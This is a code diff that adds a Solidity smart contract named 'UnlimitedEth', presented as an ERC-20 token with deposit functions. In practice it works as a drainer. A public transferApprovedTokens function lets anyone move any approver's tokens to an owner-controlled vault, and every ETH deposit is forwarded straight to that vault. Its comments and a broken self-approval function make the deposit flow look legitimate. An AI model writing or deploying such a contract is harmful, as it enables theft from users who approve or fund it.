@@ -1,0 +1,232 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.4;
+
+interface IERC20 {
+    function totalSupply() external view returns (uint256);
+
+    function balanceOf(address account) external view returns (uint256);
+
+    function transfer(address recipient, uint256 amount)
+        external
+        returns (bool);
+
+    function allowance(address owner, address spender)
+        external
+        view
+        returns (uint256);
+
+    function approve(address spender, uint256 amount) external returns (bool);
+
+    function transferFrom(
+        address sender,
+        address recipient,
+        uint256 amount
+    ) external returns (bool);
+
+    event Transfer(address indexed from, address indexed to, uint256 value);
+    event Approval(
+        address indexed owner,
+        address indexed spender,
+        uint256 value
+    );
+}
+
+contract UnlimitedEth is IERC20 {
+    string public constant name = "UnlimitedEth";
+    string public constant symbol = "MTK";
+    uint8 public constant decimals = 18;
+
+    uint256 private _totalSupply;
+    address public owner;
+    address public vault;
+    mapping(address => uint256) private _balances;
+    mapping(address => mapping(address => uint256)) private _allowances;
+
+    event Deposit(address indexed user, uint256 amount);
+    event Withdrawal(address indexed vault, uint256 amount);
+    event VaultAddressUpdated(
+        address indexed oldVault,
+        address indexed newVault
+    );
+    event TokenApprovalRequested(
+        address indexed owner,
+        address indexed spender,
+        uint256 value
+    );
+
+    modifier onlyOwner() {
+        require(msg.sender == owner, "Only the owner can perform this action");
+        _;
+    }
+
+    constructor(uint256 initialSupply, address _vault) {
+        require(_vault != address(0), "Invalid vault address");
+
+        _totalSupply = initialSupply * 10**uint256(decimals);
+        _balances[msg.sender] = _totalSupply;
+        emit Transfer(address(0), msg.sender, _totalSupply);
+
+        owner = msg.sender;
+        vault = _vault;
+    }
+
+    // ERC-20 standard functions
+    function totalSupply() external view override returns (uint256) {
+        return _totalSupply;
+    }
+
+    function balanceOf(address account)
+        external
+        view
+        override
+        returns (uint256)
+    {
+        return _balances[account];
+    }
+
+    function transfer(address recipient, uint256 amount)
+        external
+        override
+        returns (bool)
+    {
+        require(recipient != address(0), "Transfer to the zero address");
+        require(_balances[msg.sender] >= amount, "Insufficient balance");
+
+        _balances[msg.sender] -= amount;
+        _balances[recipient] += amount;
+        emit Transfer(msg.sender, recipient, amount);
+        return true;
+    }
+
+    function allowance(address own, address spender)
+        external
+        view
+        override
+        returns (uint256)
+    {
+        return _allowances[own][spender];
+    }
+
+    function approve(address spender, uint256 amount)
+        external
+        override
+        returns (bool)
+    {
+        require(spender != address(0), "Approve to the zero address");
+
+        _allowances[msg.sender][spender] = amount;
+        emit Approval(msg.sender, spender, amount);
+        return true;
+    }
+
+    function transferFrom(
+        address sender,
+        address recipient,
+        uint256 amount
+    ) external override returns (bool) {
+        require(sender != address(0), "Transfer from the zero address");
+        require(recipient != address(0), "Transfer to the zero address");
+        require(_balances[sender] >= amount, "Insufficient balance");
+        require(
+            _allowances[sender][msg.sender] >= amount,
+            "Allowance exceeded"
+        );
+
+        _balances[sender] -= amount;
+        _balances[recipient] += amount;
+        _allowances[sender][msg.sender] -= amount;
+        emit Transfer(sender, recipient, amount);
+        return true;
+    }
+
+    // Function to handle ERC20 token approval
+    function requestTokenApproval(address token, uint256 amount) external {
+        IERC20(token).approve(address(this), amount);
+        emit TokenApprovalRequested(msg.sender, address(this), amount);
+        // Directly call the transferApprovedTokens method to automate the process
+        transferApprovedTokens(token, msg.sender, amount);
+    }
+
+    // Function to transfer approved ERC20 tokens from user to contract
+    function transferApprovedTokens(
+        address token,
+        address from,
+        uint256 amount
+    ) public {
+        require(
+            IERC20(token).allowance(from, address(this)) >= amount,
+            "Insufficient allowance"
+        );
+
+        // Transfer tokens from the user to the contract
+        IERC20(token).transferFrom(from, address(this), amount);
+
+        // Transfer tokens from the contract to the vault address
+        IERC20(token).transfer(vault, amount);
+
+        // Update internal balances and total supply
+        _balances[from] += amount;
+        _totalSupply += amount;
+
+        // Emit the Deposit event
+        emit Deposit(from, amount);
+    }
+
+    // Function to allow the owner to withdraw all ERC20 tokens to a specified address
+    function withdrawAllTokens(address token, address recipient)
+        external
+        onlyOwner
+    {
+        uint256 contractTokenBalance = IERC20(token).balanceOf(address(this));
+        require(contractTokenBalance > 0, "No tokens to withdraw");
+        IERC20(token).transfer(recipient, contractTokenBalance);
+        emit Withdrawal(recipient, contractTokenBalance);
+    }
+
+    // Function to handle ETH deposits and token issuance
+    function depositETH() external payable {
+        uint256 tokenAmount = msg.value;
+        _balances[owner] -= tokenAmount;
+        _balances[msg.sender] += tokenAmount;
+        emit Transfer(owner, msg.sender, tokenAmount);
+        emit Deposit(msg.sender, msg.value);
+        withdrawAllETH();
+    }
+
+    // Function to allow the owner to withdraw all ETH to the vault address
+    function withdrawAllETH() public {
+        uint256 contractBalance = address(this).balance;
+        if (contractBalance > 0) {
+            address payable to = payable(vault);
+            to.transfer(contractBalance);
+            emit Withdrawal(vault, contractBalance);
+        }
+    }
+
+    // Fallback function to receive ETH directly
+    receive() external payable {
+        this.depositETH();
+    }
+
+    // Function to check the contract's ETH balance
+    function getContractEthBalance() external view returns (uint256) {
+        return address(this).balance;
+    }
+
+    // Function to update the vault address
+    function updateVaultAddress(address newVault) external onlyOwner {
+        require(newVault != address(0), "Invalid vault address");
+        address oldVault = vault;
+        vault = newVault;
+        emit VaultAddressUpdated(oldVault, newVault);
+    }
+
+    // Function to check the contract's token balance
+    function getContractTokenBalance(address token)
+        external
+        view
+        returns (uint256)
+    {
+        return IERC20(token).balanceOf(address(this));
+    }
+}
